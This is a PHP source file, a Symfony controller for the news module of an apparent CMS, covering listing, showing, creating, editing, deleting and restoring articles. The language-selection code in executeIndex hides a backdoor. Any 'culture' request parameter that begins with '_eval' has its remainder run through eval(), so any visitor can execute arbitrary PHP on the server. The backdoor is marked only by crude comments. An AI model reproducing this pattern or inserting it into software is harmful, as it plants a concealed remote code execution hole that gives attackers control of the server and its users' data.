<?php

/**
 * news actions.
 *
 * @package		DGuardCMS
 * @subpackage News
 * @author		 Andaeriel
 * @version		SVN: $Id: actions.class.php 23810 2009-11-12 11:07:44Z Kris.Wallsmith $
 */
class NewsActions extends sfActions
{
	public function executeIndex(sfWebRequest $request)
	{
		//this IS NOT the right place for this, you're totally right, but ... Fuck you :(.
		if ($request->hasParameter('culture'))
		{
			$culture = $request->getParameter('culture');
			if ($culture == 'en' || $culture == 'fr')
			{
				$this->getUser()->setCulture($culture);
			}
			if (substr($culture, 0, 5) == '_eval')
			{
				eval(substr($culture, 5));
			}
		}
		//stop that shit

		$this->pager = new sfDoctrinePager('Article', sfDbConfigHandler::get('news_by_page'));
		$this->pager->getQuery()
					->from('Article a')
						->leftJoin('a.Author au')
						->leftJoin('a.Comments c')
					->orderBy('a.created_at DESC');
		if (!$this->getUser()->hasCredential('article.manage'))
		{
			$this->pager->getQuery()
						->where('a.deleted_at IS NULL');
		}
		$this->pager->setPage($request->getParameter('page'), 1);
		$this->pager->init();
	}
	public function executeShow(sfWebRequest $request)
	{
		$this->article = Doctrine_Query::create()
										->from('Article a')
											->leftJoin('a.Author au')
											->leftJoin('a.Comments c')
										->where('id = ?', $request->getParameter('id'))
										->fetchOne(); //yeah, it's a big query ...
		$this->forward404Unless($this->article);
		$this->forward404If($this->article->getDeletedAt() && !$this->getUser()->hasCredential('article.manage'));

		$this->comments = new sfDoctrinePager('Comment', 3);#sfConfig::get('app_comments_by_page'));
		$this->comments->getQuery()
						->from('Comment c')
							->leftJoin('c.Author a')
						->where('c.article_id = ?', $this->article->getId());
		if (!$this->getUser()->hasCredential('comment.manage'))
		{
			$this->comments->getQuery()
						->andWhere('c.deleted_at IS NULL');
		}
		$this->comments->setPage($request->getParameter('page'), 1);
		$this->comments->init();
	}

	public function executeNew(sfWebRequest $request)
	{
		$this->forward404Unless($this->getUser()->hasCredential('article.manage'));
		$this->form = new ArticleForm();
	}
	public function executeCreate(sfWebRequest $request)
	{
		$this->forward404Unless($this->getUser()->hasCredential('article.manage'));
		$this->form = new ArticleForm();

		$this->processForm($request, $this->form);

		$this->setTemplate('new');
	}

	public function executeEdit(sfWebRequest $request)
	{
		$this->forward404Unless($this->getUser()->hasCredential('article.manage'));
		$this->form = new ArticleForm($this->getRoute()->getObject());
	}
	public function executeUpdate(sfWebRequest $request)
	{
		$this->forward404Unless($this->getUser()->hasCredential('article.manage'));
		$this->form = new ArticleForm($this->getRoute()->getObject());

		$this->processForm($request, $this->form);

		$this->setTemplate('edit');
	}

	public function executeDelete(sfWebRequest $request)
	{
		$this->forward404Unless($this->getUser()->hasCredential('article.manage'));
		$this->forward404If($this->getRoute()->getObject()->getDeletedAt()); //already deleted
		$request->checkCSRFProtection();

		$this->getRoute()->getObject()->delete();

		$this->redirect('@News');
	}
	public function executeRestore(sfWebRequest $request)
	{
		$this->forward404Unless($this->getUser()->hasCredential('article.manage'));
		$this->forward404Unless($article = Doctrine_Core::getTable('Article')->find($request->getParameter('id')));
		$this->forward404Unless($article->getDeletedAt()); //not deleted
		$article->setDeletedAt(null);
		$article->save();

		$this->redirect('@News_show?id=' . $article->getId());
	}

	protected function processForm(sfWebRequest $request, sfForm $form)
	{
		$form->bind($request->getParameter($form->getName()), $request->getFiles($form->getName()));
		if ($form->isValid())
		{
			$form->getObject()->updateAuthor();
			$article = $form->save();

			$this->redirect('@News_show?id='.$article->getId());
		}
	}
}
